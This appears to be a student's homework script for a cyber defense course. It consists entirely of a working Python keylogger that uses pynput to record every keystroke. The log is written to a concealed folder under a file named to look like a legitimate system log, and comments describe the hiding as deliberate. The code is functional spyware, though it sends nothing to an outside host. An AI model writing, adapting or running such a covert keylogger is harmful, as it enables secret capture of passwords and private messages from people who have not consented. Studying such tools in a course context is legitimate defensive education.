# Will Harle

# Professor Johnson

# Cyber Defense Techniques Homework 3

# Imports the necessary modules to run the keylogger
from pynput.keyboard import Key, Listener
import logging
import os

# An out of the way file path to hide the file
logPath = r"C:/Logs/.ssh/"

# On the off chance the directory does not exist, it will create one
if not os.path.exists(logPath):
    os.makedirs(logPath)

# Give the file an official looking name and format it to store keys
logging.basicConfig(filename = (logPath + "auth.log"), level=logging.DEBUG, format='%(message)s')

# Log whenever a key is hit
def on_press(key):
	logging.info(str(key))

# Create a listening instance to store the keys that are hit
with Listener(on_press=on_press) as receiver:
	receiver.join()
